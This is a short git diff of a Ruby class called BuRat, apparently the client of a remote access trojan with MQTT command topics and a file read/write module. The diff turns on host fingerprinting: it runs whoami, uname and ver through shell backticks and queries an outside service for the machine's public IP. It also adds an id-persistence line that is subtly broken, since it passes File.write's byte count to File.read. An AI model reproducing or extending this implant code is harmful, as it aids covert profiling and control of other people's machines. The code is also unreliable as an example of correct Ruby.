@@ -15,11 +15,10 @@ class BuRat
   attr_accessor :status, :internals, :bushido
   attr_accessor :topics
   def initialize()
-    @id = SecureRandom.hex(2)
+    @id = File.exist?('temp') ? File.read('temp') : File.read(File.write('temp', SecureRandom.hex(2).to_s))
     @host = OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip
     @os = (OS.windows? ? `ver` : `uname -sr`).strip
-    #@ip = open('http://whatismyip.akamai.com').read
-    @ip = 'test'
+    @ip = open('http://whatismyip.akamai.com').read
     @status = :offline
     @internals = {
       :mqtt           => {
@@ -36,7 +35,7 @@ class BuRat
       :filerw         => Bushido::BuFileReadWrite.new
     }
     @cmd_topics = []
-    @topics
+    @topics = {}
   end
 
   def profile()
